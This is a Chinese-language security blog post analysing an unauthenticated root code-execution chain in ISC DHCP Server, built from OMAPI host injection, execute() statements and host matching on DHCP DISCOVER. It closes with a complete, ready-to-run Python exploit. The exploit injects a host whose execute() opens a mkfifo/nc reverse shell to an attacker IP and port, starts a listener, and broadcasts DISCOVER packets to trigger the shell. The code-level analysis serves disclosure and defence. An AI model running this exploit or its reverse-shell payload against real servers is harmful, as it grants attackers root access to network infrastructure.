#  ISC DHCP Server：利用特性链实现未认证的Root远程代码执行  
 幻泉之洲   2026-05-05 05:39  
  
> ISC DHCP Server默认开启OMAPI管理接口且无认证，允许攻击者通过TCP注入包含execute()语句的host对象。随后只需发送一个DHCP DISCOVER广播包，就能触发服务器以root权限执行任意命令。这不是内存破坏漏洞，而是三个正常功能组合成的攻击链——OMAPI、execute()、主机匹配。从代码审计到PoC，完整重构了整个攻击流程。  
  
## 背景：为什么会有这个研究  
  
做实验室VM里网络服务的代码审计，顺手翻了翻ISC DHCP Server（dhcpd）。这是Linux环境里最常见的DHCP实现，从90年代中期活到现在。  
  
我克隆了代码，用Opus 4.6从攻击者视角建了个知识库，花时间读源码、让AI帮我找潜在入口点。结果没找到传统漏洞，倒是发现了一条很有趣的特性链——把几个设计意图完全正常的功能串起来，就能实现未认证的远程root代码执行。  
  
不是内存破坏，不是逻辑漏洞。纯粹是理解软件怎么设计的，各个组件怎么互动，这些互动如何从网络访问一路走到任意命令执行。  
  
有时候最危险的bug根本不是bug——全是文档里写明了的特性，只是没人从攻击角度想过它们的组合。  
## ISC DHCP Server 小传  
  
ISC DHCP Server由Internet Systems Consortium维护，是DHCP的参考实现。从90年代中期部署到全球数百万台设备上——小到办公室服务器，大到企业网络和ISP。  
  
注意：ISC在2022年底正式宣布DHCP Server停止维护。最后版本是4.4.3-P1和4.1-ESV-R16-P2，2022年10月5日发布。他们推荐迁移到新服务Kea。但很多Linux发行版还在自带，生产环境也还没迁移完。完整公告见：https://www.isc.org/dhcp/  
  
服务器以root身份运行，因为它需要特权访问链路层原始套接字来收发DHCP包。它负责IP分配、租约管理和网络客户端的动态配置。  
  
很容易找到它的进程和监听端口：  
  
➜  ~ ps aux | grep -i dhcpd  
  
root     1619626  0.0  0.1 105572 10344 ?        Ssl  18:34   0:00 /usr/sbin/dhcpd  
  
➜  ~ sudo ss -tulnp | grep dhcpd  
  
udp   UNCONN 0      0            0.0.0.0:67         0.0.0.0:*    users:(("dhcpd",pid=1619626,fd=10))  
  
tcp   LISTEN 0      1            0.0.0.0:7911       0.0.0.0:*    users:(("dhcpd",pid=1619626,fd=11))  
## DHCP是啥？  
  
DHCP自动给设备分配IP和网络配置。每次连Wi-Fi或插网线，DHCP就帮你搞定IP地址、默认网关和DNS，不用手动设。  
  
ISC dhcpd就是协议的服务端。它监听广播包，管理可用IP池（租约），通过MAC地址追踪谁占了哪个IP，处理续租和过期。  
  
还支持静态主机声明，管理员可以绑定特定MAC到固定IP，加上自定义配置。这个后面会用到。  
## OMAPI是什么？  
  
OMAPI（对象管理API）是dhcpd暴露的基于TCP的管理协议。只要在dhcpd.conf里配了omapi-port  
指令，服务器就监听那个TCP端口，允许客户端创建、修改、查询、删除服务器对象，比如主机、租约、分组。  
  
在server/dhcpd.c  
里，OMAPI监听器的启动代码：  
  
void postdb_startup (void) {  
  
  if (omapi_port != -1) {  
  
    omapi_listener_start (0);  
  
  }  
  
OMAPI支持可选的HMAC-MD5认证，通过omapi-key  
指令配置。但注意——这是链条的第一环——认证完全是可选的。很多部署为了用管理工具打开了OMAPI，却没配密钥，接口就这么敞着。  
  
常见暴露OMAPI的配置就一行：  
  
omapi-port 7911;  
  
完了。没认证。能访问TCP 7911的人就能操作服务器对象。  
## 拆解攻击链  
  
每个组件都按设计工作。问题出在它们交互时。攻击者连接OMAPI TCP端口（默认无认证），创建一个host对象，statements  
属性里塞进一个execute()  
指令，hardware-address  
填一个已知DHCP客户端的MAC。  
  
服务器用和解析dhcpd.conf  
时完全一样的配置解析器来处理我们塞进去的语句——没有任何限制允许哪些语句类型。解析结果存到内存里，挂到host条目上。  
  
然后我们发一个DHCP DISCOVER广播。这是未授权操作，任何本地用户都能做，只要chaddr  
字段匹配我们注册的MAC。  
  
dhcpd处理广播时，按硬件地址查找host条目，找到我们注入的那条，然后执行挂在上面的语句——这个执行过程是DHCP正常处理流程的一部分。我们的execute()  
调用fork()  
 + execvp()  
，以dhcpd运行的用户身份——root。  
  
从一条未经认证的TCP连接到root代码执行，每一个步骤都是文档里写明的功能，按设计工作。  
## OMAPI接受host对象上的statements属性  
  
在dhcpd的配置语言里，host声明可以包含可执行语句——也就是当主机在DHCP处理中被匹配时运行的配置指令。和你在dhcpd.conf  
的host {}  
块里写的一模一样：  
  
host example {  
  
    hardware ethernet 00:11:22:33:44:55;  
  
    fixed-address 10.0.0.100;  
  
    option domain-name-servers 8.8.8.8;  
  
    execute("/usr/local/bin/notify", "new-lease", "10.0.0.100");  
  
}  
  
内部实现里，每个host声明都有一个group  
指针，group里有一个executable_statement  
结构的链表：  
  
struct group {  
  
    struct group *next;  
  
    int refcnt;  
  
    struct group_object *object;  
  
    struct subnet *subnet;  
  
    struct shared_network *shared_network;  
  
    int authoritative;  
  
    struct executable_statement *statements;  
  
};  
  
  
struct host_decl {  
  
    ...  
  
    struct group *group;  
  
    ...  
  
};  
  
既然OMAPI暴露出来了，我就想深入看看能拿它做什么。我发现当OMAPI收到创建或更新host对象的请求时，会通过dhcp_host_set_value()  
处理属性（server/omapi.c  
）。支持属性里就有statements  
，允许直接把可执行配置语言注入到host条目里：  
  
isc_result_t dhcp_host_set_value (omapi_object_t *h,  
  
                                  omapi_object_t *id,  
  
                                  omapi_data_string_t *name,  
  
                                  omapi_typed_data_t *value)  
  
{  
  
    ......  
  
    if (!omapi_ds_strcmp (name, "statements")) {  
  
        if (!host -> group) {  
  
            if (!clone_group (&host -> group, root_group, MDL))  
  
                return ISC_R_NOMEMORY;  
  
        } else {  
  
            if (host -> group -> statements &&  
  
                (!host -> named_group ||  
  
                 host -> group != host -> named_group -> group) &&  
  
                host -> group != root_group)  
  
                return ISC_R_EXISTS;  
  
            if (!clone_group (&host -> group, host -> group, MDL))  
  
                return ISC_R_NOMEMORY;  
  
        }  
  
        if (!host -> group)  
  
            return ISC_R_NOMEMORY;  
  
  
        if (value && (value -> type == omapi_datatype_data ||  
  
                      value -> type == omapi_datatype_string)) {  
  
            struct parse *parse;  
  
            int lose = 0;  
  
            parse = (struct parse *)0;  
  
            status = new_parse(&parse, -1,  
  
                               (char*) value->u.buffer.value,  
  
                               value->u.buffer.len,  
  
                               "network client", 0);  
  
            if (status != ISC_R_SUCCESS || parse == NULL)  
  
                return status;  
  
            if (!(parse_executable_statements  
  
                  (&host -> group -> statements, parse, &lose,  
  
                   context_any))) {  
  
                end_parse (&parse);  
  
                return DHCP_R_BADPARSE;  
  
            }  
  
            end_parse (&parse);  
  
        } else  
  
            return DHCP_R_INVALIDARG;  
  
        return ISC_R_SUCCESS;  
  
    }  
  
当dhcpd匹配DHCP包到某个host条目时，它遍历host->group->statements  
并逐个执行。这就是如何实现per-host配置的——设置DHCP选项、日志、条件逻辑，没错，还有通过execute()  
运行系统命令。  
  
OMAPI通过statements  
属性暴露了完全相同的机制。当你通过OMAPI创建host对象，并包含一个statements  
值时，服务器拿你的原始字节，喂给和解析dhcpd.conf  
时一模一样的配置解析器。结果存到host->group->statements  
里，和来自配置文件的语句没有区别。  
  
代码里就是这样：OMAPI收到设置host对象属性的请求，调用dhcp_host_set_value()  
。函数把属性名和一系列字符串比较——name  
、hardware-address  
、hardware-type  
、ip-address  
，然后就是我们关心的statements  
。  
  
函数克隆host的group（如果没有就从root_group  
创建），然后通过new_parse()  
从OMAPI原始value字节创建解析器。关键调用是parse_executable_statements()  
，最后一个参数是context_any  
。这个context参数控制解析器接受哪些语句类型——context_any  
意味着所有类型。  
  
没有白名单，没有过滤，没有区分“安全”语句（比如设置DHCP选项）和危险语句（比如执行系统命令）。  
## parse_executable_statements 把攻击者输入当配置语言解析  
  
parse_executable_statements()  
在common/parse.c  
里，和启动时解析dhcpd.conf  
的解析器是同一个。它循环读输入，解析每条语句，链成一个executable_statement  
结构链表：  
  
int parse_executable_statements (statements, cfile, lose, case_context)  
  
    struct executable_statement **statements;  
  
    struct parse *cfile;  
  
    int *lose;  
  
    enum expression_context case_context;  
  
{  
  
    struct executable_statement **next;  
  
    next = statements;  
  
    while (parse_executable_statement (next, cfile, lose, case_context))  
  
        next = &((*next) -> next);  
  
    if (!*lose)  
  
        return 1;  
  
    return 0;  
  
}  
  
每次迭代调用parse_executable_statement()  
，这是一个巨大的switch语句，处理配置语言里所有语句类型。其中就有EXECUTE  
分支——解析器识别execute("command", "arg1", "arg2", ...);  
并构建一个executable_statement  
，操作码为execute_statement  
：  
  
case EXECUTE:  
  
#ifdef ENABLE_EXECUTE  
  
    skip_token(&val, NULL, cfile);  
  
    if (!executable_statement_allocate (result, MDL))  
  
        log_fatal ("no memory for execute statement.");  
  
    (*result)->op = execute_statement;  
  
    token = next_token(&val, NULL, cfile);  
  
    if (token != LPAREN) {  
  
        parse_warn(cfile, "left parenthesis expected.");  
  
        skip_to_semi(cfile);  
  
        *lose = 1;  
  
        return 0;  
  
    }  
  
    token = next_token(&val, &len, cfile);  
  
    if (token != STRING) {  
  
        parse_warn(cfile, "Expecting a quoted string.");  
  
        skip_to_semi(cfile);  
  
        *lose = 1;  
  
        return 0;  
  
    }  
  
    (*result)->data.execute.command = dmalloc(len + 1, MDL);  
  
    if ((*result)->data.execute.command == NULL)  
  
        log_fatal("can't allocate command name");  
  
    strcpy((*result)->data.execute.command, val);  
  
    ep = &(*result)->data.execute.arglist;  
  
    (*result)->data.execute.argc = 0;  
  
    while ((token = next_token(&val, NULL, cfile)) == COMMA) {  
  
        if (!expression_allocate(ep, MDL))  
  
            log_fatal ("can't allocate expression");  
  
        if (!parse_data_expression (&(*ep) -> data.arg.val,  
  
                                    cfile, lose)) {  
  
            if (!*lose) {  
  
                parse_warn (cfile, "expecting expression.");  
  
                *lose = 1;  
  
            }  
  
            skip_to_semi(cfile);  
  
            *lose = 1;  
  
            return 0;  
  
        }  
  
        ep = &(*ep)->data.arg.next;  
  
        (*result)->data.execute.argc++;  
  
    }  
  
解析器提取命令字符串（第一个参数），构建参数表达式链表。全部存到result->data.execute  
里——命令路径在.command  
，参数链表在.arglist  
，数量在.argc  
。  
  
execute()  
语句被ENABLE_EXECUTE  
编译开关控制，但默认是开启的。configure.ac  
里：  
  
# execute() support.  
  
AC_ARG_ENABLE(execute,  
  
    AS_HELP_STRING([--enable-execute],[enable support for execute() in config (default is yes)]))  
  
# execute() is on by default, so define if it is not explicitly disabled.  
  
if test "$enable_execute" != "no" ; then  
  
    enable_execute="yes"  
  
    AC_DEFINE([ENABLE_EXECUTE], [1],  
  
              [Define to include execute() config language support.])  
  
fi  
  
每个标准构建的ISC DHCP Server都编译了execute()  
。你需要在编译时显式传递--disable-execute  
才能去掉，没人会这么干——大多数人甚至不知道有这开关。  
## DHCP处理中的主机匹配触发语句执行  
  
dhcpd处理DHCP DISCOVER或REQUEST时，按客户端MAC地址查找host条目。在server/dhcp.c  
里，ack_lease()  
调用find_hosts_by_haddr()  
，chaddr  
字段直接从原始DHCP包取：  
  
if (!host) {  
  
    find_hosts_by_haddr (&hp,  
  
                         packet -> raw -> htype,  
  
                         packet -> raw -> chaddr,  
  
                         packet -> raw -> hlen,  
  
                         MDL);  
  
    for (h = hp; h; h = h -> n_ipaddr) {  
  
        if (!h -> fixed_addr)  
  
            break;  
  
    }  
  
    if (h)  
  
        host_reference (&host, h, MDL);  
  
    if (hp != NULL)  
  
        host_dereference(&hp, MDL);  
  
}  
  
找到匹配的host声明后，代码运行所有挂在该host group上的语句，包括我们注入的execute()  
：  
  
if (host)  
  
    execute_statements_in_scope (NULL, packet, lease, NULL,  
  
                                 packet->options, state->options,  
  
                                 &lease->scope, host->group,  
  
                                 (lease->pool  
  
                                  ? lease->pool->group  
  
                                  : lease->subnet->group),  
  
                                 NULL);  
  
execute_statements_in_scope()  
在common/execute.c  
里递归遍历group作用域链，对每个group的语句列表调用execute_statements()  
：  
  
void execute_statements_in_scope (result, packet,  
  
                                  lease, client_state, in_options,  
  
                                  out_options, scope, group,  
  
                                  limiting_group, on_star)  
  
{  
  
    struct group *limit;  
  
    if (!group)  
  
        return;  
  
    for (limit = limiting_group; limit; limit = limit -> next) {  
  
        if (group == limit)  
  
            return;  
  
    }  
  
    if (group -> next)  
  
        execute_statements_in_scope (result, packet,  
  
                                     lease, client_state,  
  
                                     in_options, out_options, scope,  
  
                                     group->next, limiting_group,  
  
                                     on_star);  
  
    execute_statements (result, packet, lease, client_state,  
  
                        in_options, out_options, scope,  
  
                        group->statements, on_star);  
  
}  
  
execute_statements()  
遍历executable_statement  
链表。遇到execute_statement  
操作码时，从存储的命令和参数构建argv  
数组，然后调用fork()  
 + execvp()  
：  
  
case execute_statement: {  
  
#ifdef ENABLE_EXECUTE  
  
    struct expression *expr;  
  
    char **argv;  
  
    int i, argc = r->data.execute.argc;  
  
    pid_t p;  
  
    argv = dmalloc((argc + 2) * sizeof(*argv), MDL);  
  
    if (!argv)  
  
        break;  
  
    argv[0] = dmalloc(strlen(r->data.execute.command) + 1, MDL);  
  
    if (argv[0]) {  
  
        strcpy(argv[0], r->data.execute.command);  
  
    } else {  
  
        goto execute_out;  
  
    }  
  
    for (i = 1, expr = r->data.execute.arglist; expr;  
  
         expr = expr->data.arg.next, i++) {  
  
        memset(&ds, 0, sizeof(ds));  
  
        status = (evaluate_data_expression  
  
                  (&ds, packet,  
  
                   lease, client_state, in_options,  
  
                   out_options, scope,  
  
                   expr->data.arg.val, MDL));  
  
        if (status) {  
  
            argv[i] = dmalloc(ds.len + 1, MDL);  
  
            if (argv[i]) {  
  
                memcpy(argv[i], ds.data, ds.len);  
  
                argv[i][ds.len] = 0;  
  
            }  
  
            data_string_forget (&ds, MDL);  
  
            if (!argv[i]) {  
  
                goto execute_out;  
  
            }  
  
        } else {  
  
            goto execute_out;  
  
        }  
  
    }  
  
    argv[i] = NULL;  
  
    if ((p = fork()) > 0) {  
  
        int status;  
  
        waitpid(p, &status, 0);  
  
    } else if (p == 0) {  
  
        execvp(argv[0], argv);  
  
        log_error("Unable to execute %s: %m", argv[0]);  
  
        _exit(127);  
  
    }  
  
}  
  
没有沙箱，没有降权，没有环境清理，没有任何对可执行路径的限制。execvp()  
以dhcpd运行的用户身份执行——也就是root。  
  
攻击者的命令字符串从OMAPI TCP消息，经过解析器，进入host的group statements，最后直接以root权限通过系统调用execvp()  
执行。  
## 触发条件是不需要特权的  
  
发一个DHCP DISCOVER不需要任何特权。就是一个UDP广播：  
- 源端口：任意（我们是客户端）  
  
- 目标端口：67（DHCP服务器）  
  
- 目标地址：255.255.255.255（广播）  
  
- 套接字选项：SO_BROADCAST（不是特权操作）  
  
DHCP DISCOVER包含一个chaddr  
字段，我们填上匹配已注入host条目的MAC地址。dhcpd的BPF过滤器捕获这个广播帧，处理它，匹配到我们的host，然后触发execute()  
。  
## 整合起来  
  
这些功能单独看都没有bug。OMAPI按设计工作，execute()  
按设计工作，主机匹配按设计工作，UDP广播不需要root。但把它们串起来，网络上的任何未授权用户都能得到root RCE。  
```
#!/usr/bin/python3
# Exploit Title: ISC DHCP Server 4.1-4.4.x - Remote Code Execution (RCE)
# Date: 2026-04-29
# Exploit Author: Askar (@mohammadaskar2)
# Vendor Homepage: https://www.isc.org/dhcp/
# Version: 4.1.0 - 4.4.3-P1 (any version compiled with execute() support)
# Tested on: Debian 13
import argparse
import socket
import struct
import sys
import os
import time
import random
import subprocess
import select
from threading import Thread, Event
OMAPI_PORT = 7911
def pack_intro():
    return struct.pack("!II", 100, 24)
def pack_nv(name, value):
    return struct.pack("!H", len(name)) + name + struct.pack("!I", len(value)) + value
def pack_nv_int(name, value):
    return struct.pack("!H", len(name)) + name + struct.pack("!II", 4, value)
def pack_nv_end():
    return struct.pack("!H", 0)
def pack_message(op, handle, xid, rid, msg_nvs, obj_nvs):
    header = struct.pack("!IIIIII", 0, 0, op, handle, xid, rid)
    body = b""
    for nv in msg_nvs:
        body += nv
    body += pack_nv_end()
    for nv in obj_nvs:
        body += nv
    body += pack_nv_end()
    return header + body
def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed")
        data += chunk
    return data
def recv_response(sock):
    header = recv_exact(sock, 24)
    authid, authlen, op, handle, xid, rid = struct.unpack("!IIIIII", header)
    nvs = {}
    for _ in range(2):
        while True:
            nlen = struct.unpack("!H", recv_exact(sock, 2))[0]
            if nlen == 0:
                break
            name = recv_exact(sock, nlen)
            vlen = struct.unpack("!I", recv_exact(sock, 4))[0]
            value = recv_exact(sock, vlen)
            nvs[name] = value
    if authlen > 0:
        recv_exact(sock, authlen)
    return {"op": op, "handle": handle, "nvs": nvs}
class OmapiConn:
    def __init__(self, host, port=7911, timeout=10):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = None
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.host, self.port))
        self.sock.sendall(pack_intro())
        intro = recv_exact(self.sock, 8)
        ver, _ = struct.unpack("!II", intro)
        if ver != 100:
            raise ConnectionError(f"Bad OMAPI version: {ver}")
    def reconnect(self):
        self.close()
        time.sleep(0.5)
        self.connect()
    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None
    def transact(self, op, handle, xid, msg_nvs, obj_nvs):
        msg = pack_message(op, handle, xid, 0, msg_nvs, obj_nvs)
        self.sock.sendall(msg)
        return recv_response(self.sock)
def format_mac(mac_bytes):
    return ":".join(f"{b:02x}" for b in mac_bytes)
def parse_mac(mac_str):
    mac_str = mac_str.replace('-', ':')
    parts = mac_str.split(':')
    if len(parts) != 6:
        print(f"[-] Invalid MAC address: {mac_str} (need 6 octets, got {len(parts)})")
        sys.exit(1)
    return bytes(int(b, 16) for b in parts)
def get_local_mac():
    result = subprocess.run(["ip", "route", "show", "default"],
                           capture_output=True, text=True)
    iface = None
    for line in result.stdout.strip().split('\n'):
        parts = line.split()
        if 'dev' in parts:
            iface = parts[parts.index('dev') + 1]
            break
    if not iface:
        return None, None
    result = subprocess.run(["ip", "-o", "link", "show", iface],
                           capture_output=True, text=True)
    for part in result.stdout.split():
        if ':' in part and len(part) == 17 and all(c in '0123456789abcdef:' for c in part):
            mac_bytes = bytes(int(b, 16) for b in part.split(':'))
            return mac_bytes, iface
    return None, None
# Reference: RFC 2131 - Dynamic Host Configuration Protocol
# https://datatracker.ietf.org/doc/html/rfc2131
#section
-2
def build_dhcp_discover(mac_bytes):
    xid = random.randint(0, 0xFFFFFFFF)
    pkt = struct.pack("!BBBB", 1, 1, 6, 0)      # op=BOOTREQUEST, htype=ETH, hlen=6, hops=0
    pkt += struct.pack("!I", xid)                 # xid (transaction ID)
    pkt += struct.pack("!HH", 0, 0x8000)         # secs=0, flags=BROADCAST
    pkt += b'\x00' * 4                            # ciaddr (client IP - 0 for DISCOVER)
    pkt += b'\x00' * 4                            # yiaddr (your IP - filled by server)
    pkt += b'\x00' * 4                            # siaddr (server IP)
    pkt += b'\x00' * 4                            # giaddr (relay agent IP)
    pkt += mac_bytes + b'\x00' * 10               # chaddr (client hardware address, 16 bytes)
    pkt += b'\x00' * 64                           # sname (server host name)
    pkt += b'\x00' * 128                          # file (boot file name)
    pkt += struct.pack("!I", 0x63825363)          # DHCP magic cookie
    pkt += bytes([53, 1, 1])                      # Option 53: DHCP Message Type = DISCOVER
    pkt += bytes([55, 4, 1, 3, 6, 15])            # Option 55: Parameter Request List
    pkt += bytes([255])                           # Option 255: End
    return pkt
def send_dhcp_discover(mac_bytes):
    pkt = build_dhcp_discover(mac_bytes)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(pkt, ('255.255.255.255', 67))
    sock.close()
shell_connected = Event()
def connection_handler(port):
    print("[+] Listener started on port %s" % port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", int(port)))
    s.listen(1)
    conn, addr = s.accept()
    shell_connected.set()
    print("[+] Connection received from %s" % addr[0])
    print("[+] Incoming root shell!!")
    try:
        while True:
            readable, _, _ = select.select([conn, sys.stdin], [], [])
            if conn in readable:
                data = conn.recv(4096)
                if not data:
                    print("[*] Connection closed")
                    break
                sys.stdout.write(data.decode(errors="replace"))
                sys.stdout.flush()
            if sys.stdin in readable:
                cmd = sys.stdin.readline()
                if not cmd:
                    break
                conn.send(cmd.encode())
    except (BrokenPipeError, ConnectionResetError):
        print("[*] Connection lost")
    finally:
        conn.close()
        s.close()
def delete_existing_host(conn, mac_bytes):
    xid = random.randint(1, 0x7FFFFFFF)
    resp = conn.transact(1, 0, xid,
        [pack_nv(b"type", b"host")],
        [pack_nv(b"hardware-address", mac_bytes),
         pack_nv_int(b"hardware-type", 1)])
    if resp["op"] == 3 and resp["handle"] != 0:
        handle = resp["handle"]
        xid2 = random.randint(1, 0x7FFFFFFF)
        msg = pack_message(6, handle, xid2, 0, [], [])
        conn.sock.sendall(msg)
        recv_response(conn.sock)
        return True
    return False
def inject_host(conn, mac_bytes, statement):
    host_name = f"pwn-{random.randint(10000, 99999)}"
    xid = random.randint(1, 0x7FFFFFFF)
    resp = conn.transact(1, 0, xid,
        [pack_nv(b"type", b"host"),
         pack_nv_int(b"create", 1),
         pack_nv_int(b"exclusive", 1)],
        [pack_nv(b"name", host_name.encode()),
         pack_nv(b"hardware-address", mac_bytes),
         pack_nv_int(b"hardware-type", 1),
         pack_nv(b"statements", statement.encode())])
    if resp["op"] == 3:
        return host_name
    else:
        msg = resp["nvs"].get(b"message", b"unknown").decode("ascii", errors="replace")
        raise RuntimeError(f"Host creation failed: {msg}")
def main():
    parser = argparse.ArgumentParser(
        description="ISC DHCP Server - RCE via OMAPI Statement Injection")
    parser.add_argument("--target", required=True, help="IP of the dhcpd server")
    parser.add_argument("--attacker-ip", required=True, help="Your IP for reverse shell")
    parser.add_argument("--attacker-port", required=True, type=int, help="Listener port")
    parser.add_argument("--mac", help="Target MAC (auto-detected if omitted)")
    args = parser.parse_args()
    print("=" * 60)
    print(" ISC DHCP Server - Remote Code Execution (RCE)")
    print(" Unauthenticated OMAPI Statement Injection")
    print("=" * 60)
    print()
    print(f"[*] Target        : {args.target}")
    print(f"[*] Reverse shell : {args.attacker_ip}:{args.attacker_port}")
    print(f"[*] Running as    : uid={os.getuid()}")
    print()
    if args.mac:
        mac_bytes = parse_mac(args.mac)
        print(f"[+] Using provided MAC: {format_mac(mac_bytes)}")
    else:
        local_mac, local_iface = get_local_mac()
        if local_mac:
            mac_bytes = local_mac
            print(f"[+] Local MAC detected: {format_mac(mac_bytes)} ({local_iface})")
        else:
            print("[-] Could not detect local MAC. Use --mac to specify.")
            sys.exit(1)
    print(f"[*] Connecting to OMAPI on {args.target}...")
    conn = OmapiConn(args.target, OMAPI_PORT)
    try:
        conn.connect()
    except Exception as e:
        print(f"[-] OMAPI connection failed: {e}")
        sys.exit(1)
    print("[+] Connected - no authentication required!")
    deleted = delete_existing_host(conn, mac_bytes)
    if deleted:
        print(f"[+] Deleted existing host for {format_mac(mac_bytes)}")
        conn.reconnect()
    rand_pipe = f"/tmp/.p{random.randint(1000,9999)}"
    revshell = (
        f"rm -f {rand_pipe};"
        f"mkfifo {rand_pipe};"
        f"cat {rand_pipe}|/bin/sh -i 2>&1|nc {args.attacker_ip} {args.attacker_port} >{rand_pipe};"
        f"rm -f {rand_pipe}"
    )
    statement = f'execute("/bin/bash", "-c", "{revshell}");'
    print(f"[+] Injecting reverse shell payload for {format_mac(mac_bytes)}...")
    try:
        host_name = inject_host(conn, mac_bytes, statement)
    except RuntimeError as e:
        print(f"[-] {e}")
        conn.close()
        sys.exit(1)
    print(f"[+] Host '{host_name}' created with execute() payload!")
    conn.close()
    handler_thread = Thread(target=connection_handler, args=(args.attacker_port,))
    handler_thread.start()
    time.sleep(1)
    print(f"[+] Triggering payload via broadcast DHCPDISCOVER...")
    for i in range(3):
        if shell_connected.is_set():
            break
        send_dhcp_discover(mac_bytes)
        print(f"[+] DHCPDISCOVER #{i+1} sent")
        time.sleep(2)
    handler_thread.join()
if __name__ == "__main__":
    main()
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibceJjoal7Kr1Fx8prIGtPqemHKYjxrckWrBbwD3pTn6hlm6KEcT5O6FHO0Gb0s2m9CDYrAJgyuTgVJaZ38VeW8RazhEzWibVETk/640?wx_fmt=png&from=appmsg "")  
## 参考资料  
  
  
[1]   
  
https://shells.systems/chaining-isc-dhcp-server-features-for-unauthenticated-root-remote-code-execution/  
  
